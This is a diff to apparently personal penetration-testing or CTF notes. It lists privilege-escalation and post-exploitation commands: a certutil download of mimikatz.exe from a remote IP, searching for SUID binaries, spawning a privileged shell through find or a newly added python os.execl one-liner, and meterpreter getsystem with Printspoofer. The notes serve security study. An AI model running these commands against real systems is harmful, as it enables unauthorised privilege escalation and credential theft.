@@ -65,7 +65,7 @@ certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe
 - check the permissions in shell files: **cat /etc/shells | while read shell; do ls -l $shell 2>/dev/null; done** 
 - if we have **lrwxrwxrwx** permission, we can use it for execution.
 - find executables with root privileges: **find / -perm -4000 2>/dev/null** 
-- Command for privilege escalation(spawn a new shell): **find / -exec [/bin/rbash -p]{it is usually a command} \; -quit**
+- Command for privilege escalation(spawn a new shell): **find / -exec [/bin/rbash -p]{it is usually a command} \; -quit** , **python -c 'import os; os.execl("/bin/sh", "sh", "-p")'**
 - get privileges: **whoami /priv**
 - if **SeImpersonatePrivilege** token found, we can escalate privileges using **getsystem** command in the meterpreter.
 - Printspoofer can also be used for privilege escalation.
